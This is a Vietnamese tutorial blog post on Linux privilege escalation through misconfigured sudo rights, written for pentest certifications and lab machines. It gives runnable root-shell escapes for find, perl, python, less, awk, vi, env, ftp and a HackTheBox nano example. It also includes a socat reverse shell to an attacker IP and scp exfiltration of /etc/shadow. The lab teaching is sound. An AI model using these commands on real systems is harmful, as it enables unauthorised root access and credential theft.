## 0. Mở đầu
Trong nhiều chứng chỉ như OSCP, OSCE hay những lab pentesting như của [Vulnhub](https://www.vulnhub.com/), [Hackthebox](https://www.hackthebox.eu/) luôn có một phần rất rất quan trọng là chiếm **Root** của Server để có được flag. Điều này chứng tỏ rằng bạn đã hoàn toàn chinh phục được bài lab.
Đặt vào một hoàn cảnh thực tế hơn, trong quá trình Pentest, bạn có thể thực thi code (RCE) trên Server của target được pentest, mức ảnh hưởng sẽ thế nào nếu từ RCE, bạn có Full Permissions thông qua việc Privilege Escalation thành công ?
![](https://images.viblo.asia/ceee22f1-d5bf-434a-bfb3-efea6d0a5943.jpeg)


Mình sẽ cố gắng viết một series về Linux Privilege Escalation, và mình chọn method này đầu tiên vì nó liên quan tới nhiều kiến thức cơ bản. Cũng như tập trung hơn vào Ubuntu do đây là OS phổ biến được nhiều bạn đọc sử dụng nhất.
## 1. Cơ sở lý thuyết: Sudo - Super User Do root privilege task 
### 1.1 Root User
Root user là một "superuser account" trong Linux/Unix. Có mọi quyền và có thể làm bất cứ điều gì với hệ thống. Thông thường Root user sẽ có tên là **root**. Tuy nhiên trong Linux/Unix, bất kỳ account nào với user id là 0 đều là tài khoản root, bất kể tên là gì, không nhất thiết phải là tên **root**. Một user bình thường muốn chạy được các lệnh có quyền Root cần phải thông qua su hoặc sudo.

![](https://images.viblo.asia/a7898035-dbb0-4267-b264-aa4d06f82def.png)


### 1.2 Phân biệt Su và Sudo

Khi bạn gõ lệnh **su** (switch user) mà không có thêm tùy chọn gì khác, shell sẽ chuyển bạn sang root user vì user mặc định cho lệnh **su** là root, và bạn phải nhập root password. <br>Tuy nhiên, bạn có thể sử dụng nó để chuyển sang bất kỳ tài khoản người dùng nào. Nếu bạn thực thi lệnh **su user2**, bạn sẽ phải nhập password của **user2**, và shell sẽ chuyển sang tài khoản người dùng **user2**.

Khi đã hoàn thành việc chạy các lệnh trong shell root, bạn gõ exit để rời khỏi shell root và quay lại shell của bản thân với quyền được cấp.

Còn **sudo** chạy một lệnh duy nhất với quyền root. Khi bạn thực thi lệnh sudo, hệ thống sẽ yêu cầu bạn nhập password của tài khoản người dùng hiện tại trước khi chạy lệnh đó với tư cách là root user. <br>Theo mặc định của Ubuntu, shell sẽ ghi nhớ password này trong 15 phút.
Đó cũng là lý do SUDO còn có thể được hiểu là: 

![](https://images.viblo.asia/0430410f-f97f-46a5-b7e7-a5e5fe292fcc.png)


Và cũng trên mặc định của Ubuntu: bạn không thể login trực tiếp bằng user root, bạn muốn thực thi một loạt command trong shell với tư cách root, bạn sẽ phải gõ **sudo su** chứ không phải là **su**. 

![](https://images.viblo.asia/038d20ab-3fa7-442c-a87e-be63dc99d8e1.png)

Đơn giản vì theo mặc định thì Root password sẽ bị **khóa** cho đến khi bạn gán password cho nó. Điều này tùy thuộc vào Distrobution và OS bạn sử dụng. Nhưng ở Ubuntu thì chúng tôi làm thế :triumph:

![](https://images.viblo.asia/8885f676-49f0-462c-b49d-c1568f2e058b.png)



## 2. Sudoers
Hết phần mở đầu, đến phần quan trọng :point_down::point_down:
### 2.1 Khái niệm

Trong Linux/Unix, có 1 file cấu hình cho quyền sudo nằm ở **/etc/sudoers**. Đây là file mà Linux/Unix administrators sử dụng để phân bổ quyền hệ thống cho người dùng trong hệ thống. Điều này cho phép administrators kiểm soát ai có thể làm gì. Khi bạn muốn chạy một lệnh yêu cầu quyền root qua sudo, nhờ vào sudoers file, Linux/Unix sẽ biết bạn có được phép thực thi lệnh đó hay không. <br>Đây là điều xảy ra khi bạn tạo 1 user mới hoàn toàn, chưa config sudoers và muốn chạy sudo:

![](https://images.viblo.asia/81011bae-397c-47a8-8339-454b830739fc.png)

<br>

Nếu đã được config, hãy thử gõ **sudo visudo** trên terminal, nhập password, và bạn đã có thể bắt đầu chỉnh sửa sudoers file trên máy của mình. Lưu ý một lần nữa: Tùy thuộc vào OS mà nội dung sudoers file sẽ được config mặc định khác nhau, tuy nhiên về format chung và syntax là giống nhau.
### 2.2 Sudoers: File Syntax
![](https://images.viblo.asia/365b4adf-5da7-4945-a993-3826667836fa.png)

Phía trên là Sudoers File mặc định của Ubuntu (cái dấu % kia chỉ ra rằng **admin** và **sudo** là system groups). Hãy cùng xem xét kỹ hơn cấu trúc qua ví dụ dưới đây:


![](https://images.viblo.asia/d188e9dc-42b8-4be8-b4cc-bc1a78e3d09f.PNG)




Ví dụ trên có nghĩa là: User **nghia** có thể thực thi **tất cả lệnh** với **tư cách Root**, **không cần nhập password** khi yêu cầu thực thi, **nhưng** những điều kia chỉ đúng khi thực thi với path (binary) **/usr/bin/find**. Lưu ý:

*  (ALL:ALL) cũng có thể biểu diễn như là (ALL)
*  Nếu (root) nằm ở vị trí của (ALL:ALL) có nghĩa là user có thể thực thi lệnh dưới quyền root.
*  Nếu phần user/group không được định nghĩa, thì khi thực thi sudo sẽ mặc định thực thi với tư cách root user.
*  Phần **Wildcard** thường dùng chỉ định nơi mà lệnh được phép thực thi. Ví dụ mình thêm **/opt/abcxzy** vào cuối ví dụ, điều đó có nghĩa lệnh **find**, thông qua sudo, chỉ được dùng với thư mục **opt/abcxyz/**. Bạn có thể hiểu nó hơn qua ví dụ ở mục **4.**
*  Tham khảo toàn bộ cấu trúc Sudoers tại [đây](https://www.sudo.ws/man/1.8.15/sudoers.man.html)
## 3. Privilege Escalation using Sudo Rights
Và đây là phần chính, dựa vào config của Sudoers file, từ việc chỉ có thể thực thi sudo với những lệnh hạn chế, chúng ta có thể leo thang đặc quyền để có được quyền Root một cách dễ dàng. Điều này rất hữu ích khi các bạn thi chứng chỉ, làm lab, làm các bài về kiểm thử xâm nhập... Mỗi hoàn cảnh mỗi khác, nhưng hầu như sẽ chỉ là những cách dưới đây. <br><br>
Và tất cả những cách đó đều đang khả dụng !
<br>


-----
### 3.1 - Khi đặc quyền root  được gán cho Binary commands
Đôi khi người dùng có quyền thực thi bất kỳ tệp hoặc lệnh nào của một thư mục cụ thể như /bin/cp, /bin/cat hoặc /usr/bin/ find. Cùng xem ví dụ bên dưới.

#### 3.1.1 - Using Find Command
Như chúng ta đã biết phía trên, user **nghia** được config trong sudoers file với nội dung:
```
nghia ALL=(root) NOPASSWD: /usr/bin/find
```
Administrators của hệ thống quá là bủn xỉn, chỉ cho tôi quyền tìm kiếm (find), đã vậy Root luôn cho bõ ghét:
```
 sudo find /(thư mục nào đó) -exec /bin/bash \;
```
hoặc:
```
sudo find /bin -name nano -exec /bin/sh \;
```
![](https://images.viblo.asia/75d0abfa-d6c6-448f-975b-557475a9e542.png)

### 3.2 Khi đặc quyền root được gán cho Binary Programs
Đôi khi ông Administrators vui tính lại cho tôi một số quyền hạn chế với một số chương trình xác định để coding, chỉnh sửa file..., nếu nó là một trong số những chương trình sau, chẳng khác nào tôi đã có quyền root ở bất cứ nơi nào:
```
nghia ALL= (root) NOPASSWD: /usr/bin/perl, /usr/bin/python, /usr/bin/less, /usr/bin/awk, /usr/bin/man, /usr/bin/vi
```
#### 3.2.1 Using Perl
```
/usr/bin/perl
```
Command:
``` sudo perl -e 'exec "/bin/bash";' ```

![](https://images.viblo.asia/9bcc30a7-3758-4530-bf38-26afe097c75f.png)



#### 3.2.2 Using Python
```
/usr/bin/python
```
Command:
```sudo python -c 'import pty;pty.spawn("/bin/bash")'```

![](https://images.viblo.asia/735f37ed-ecf3-4ebf-937a-0d9031cb85eb.png)


#### 3.2.3 Using Less Command
```
/usr/bin/less
```
Command:
```
sudo less /etc/hosts
```

sau đó gõ **!bash** và ấn Enter:

![](https://images.viblo.asia/899d588a-d0da-49d6-9957-485d5900ace1.png)

Escape thành công:
![](https://images.viblo.asia/2f8b3cf0-ba6a-40b9-83f5-51d2c172069d.png)
#### 3.2.4 Using AWK
```
/usr/bin/awk
```
Command:
```
sudo awk 'BEGIN {system("/bin/bash")}'
```
![](https://images.viblo.asia/60f5894f-5953-421d-b4f8-e5ac287e0bc4.png)

#### 3.2.5 Using Man Command
```
/usr/bin/man
```
Command:
```
sudo man man
```
Tương tự với Less comand, thêm **!bash**, ấn Enter và có root:

![](https://images.viblo.asia/5c8fa8c1-3d13-429d-addb-9483d262315f.png)

#### 3.2.6 Using vim
```
/usr/bin/vi
```
Command:
```
sudo vi
```
Lần này hơi khác chút, thêm **:bash!**, ấn enter và có root:

![](https://images.viblo.asia/4b5da6ed-930b-400c-bebf-b2863cadf2c2.png)

### 3.3 Khi đặc quyền root được  gán cho Shell Script
Đây cũng là một dạng thường thấy trong các bài thi OSCP, khi trong sudoers file được config để người dùng có thể thực thi 1 script file xác định (có thể được viết bằng Python, bash, PHP, C...) kiểu như:
```
nghia ALL= (root) NOPASSWD: /home/nghia/root.sh, /home/nghia/root.py, /home/nghia/shell
```

#### 3.3.1 Executing Bash script
Command:
```
echo "/bin/bash -i" >> filename.sh     (nếu trong script chưa có sẵn)
sudo ./filename.sh
```
![](https://images.viblo.asia/7be5e1fd-1208-4c5f-bf52-8b4cbe449afa.png)
#### 3.3.2 Executing Python script
Script:
```
#! /usr/bin/python

print "Cái gì cũng được, mà không có cũng được"
import os
os.system("/bin/bash")
```
![](https://images.viblo.asia/80c27ae6-eaa2-4194-a9e1-f069073118e1.png)
#### 3.3.3 Executing C script
Script trong **root.c** :
```
int main(void)
{
            system("/bin/bash");
}
```
Và Command:
```
gcc root.c -o shell
chmod 777 shell
sudo ./shell
```
![](https://images.viblo.asia/1839ea49-8aa3-40cc-afae-a52704e0692e.png)


### 3.4 Khi đặc quyền root được gán cho một số chương trình khác
Phía trên chúng ta đã thấy một số programs và những script khi được gán quyền root nguy hiểm như thế nào, tuy nhiên một số chương trình sau tưởng như vô hại nhưng cũng có thể làm được điều tương tự:
```
nghia ALL=(ALL) NOPASSWD: /usr/bin/env, /usr/bin/ftp, /usr/bin/scp, /usr/bin/socat
```

#### 3.4.1 Using Env
```
sudo env /bin/bash
```
![](https://images.viblo.asia/8504b7d5-a695-4420-aa46-dce389edb24a.png)

#### 3.4.2 Using FTP
```
sudo ftp
! /bin/bash
```
hoặc
```
sudo ftp
! /bin/sh
```
![](https://images.viblo.asia/70d745ae-a6c6-4c49-91bc-7f5ac262796e.png)
#### 3.4.3 Using Socat
Trên máy tấn công (của chúng ta), command:
```
socat file:`tty`,raw,echo=0 tcp-listen:8888
```
Trên máy RCE được: 
```
sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.55.1:8888
```
Và root thành công:
![](https://images.viblo.asia/b022c7b4-4262-4863-8d15-cdbd97c27d44.png)
#### 3.4.4 Thông qua SCP
Qua SCP, chúng ta không thể có được bash shell, vì nó là một service dùng để chuyển file từ máy chủ cục bộ tới máy chủ từ xa qua port SSH (port 22). Do đó chúng ta có thể sử dụng nó để chuyển các file nhạy cảm như **/etc/passwd**, **/etc/shadow** tới máy chúng ta.
<br>
Command:
```
sudo scp /etc/passwd username@IP:~/
sudo scp /etc/shadow username@IP:~/
```
## 4. Ví dụ:
Đây là một machine mới trên [hackthebox](https://hackthebox.eu), việc exploit để có root flag sử dụng method Sudo Rights.

![](https://images.viblo.asia/b9476bba-a4ff-44e7-9909-eba8276ad556.png)
Chúng ta có thể thấy hiện tại user joanna có thể thực thi binary program **nano** với path được xác định: **/opt/priv** mà không cần nhập **password**.
<br>
Và đây là cách exploit nó, command:
```
sudo nano /opt/priv : Không yêu cầu password
Ctrl + R => Ctrl + X : Để Execute command
reset; sh 1>&0 2>&0 và ấn Enter ( như hình dùng 1>&0 cũng được )
```
![](https://images.viblo.asia/d68d4878-83c8-4710-9dad-70775ed19362.jpg)

Như vậy chỉ từ Sudo Rights, chúng ta có thể thiên biến vạn hóa nhiều cách để có được Root. Điều này là rất hữu ích và quan trọng, nhất là với những chứng chỉ về kiểm thử xâm nhập. Nơi mà tăng tối đa impact tới mục tiêu là điều cực kỳ quan trọng. <br><br>
Ngoài ra sẽ còn có một vài config khác trong **Sudoers**, các bạn có thể tìm thấy trong phần **5. Tài liệu tham khảo**
## 5. Tài liệu tham khảo
https://blog.certcube.com/abusing-sudo-linux-privilege-escalation/<br>
https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/ <Br>
https://www.linux.com/tutorials/configuring-linux-sudoers-file/<br>
https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d